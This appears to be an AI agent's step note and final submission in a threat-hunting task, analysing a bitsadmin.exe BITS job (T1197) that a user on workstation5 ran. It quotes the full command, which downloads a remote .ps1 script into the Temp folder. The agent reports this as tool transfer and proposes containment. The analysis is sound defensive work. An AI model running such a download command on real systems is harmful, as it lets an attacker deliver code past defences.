steps.text: This looks like an interactive command simulating a malicious BITS job (T1197). I've gathered the relevant artifacts—host, user, process, and command—but there's no file entity involved here, so I'll submit it as is.

submission.reasoning: An interactive cmd.exe (proc-29da349e7e) running as WORKSTATION5\wardog at High integrity started bitsadmin.exe (proc-826bdb1e01) on workstation5 at 2020-10-23T06:36:43Z. The command was '/transfer /Download /priority Foreground https://raw.githubusercontent.com/... C:\Users\wardog\AppData\Local\Temp\bitsadmin1_flag.ps1'. This uses BITS (T1197) to download a remote file into the user's Temp folder and save it as a .ps1 script. That is ingress tool transfer through a LOLBin, matching the Atomic Red Team T1197 attack emulation. A search for the .ps1 found no file entity in the graph, so there is no evidence the downloaded script was written or executed. Response: isolate the host, rotate the wardog credentials, block the download source, and check for and remove the downloaded file and any leftover BITS jobs.
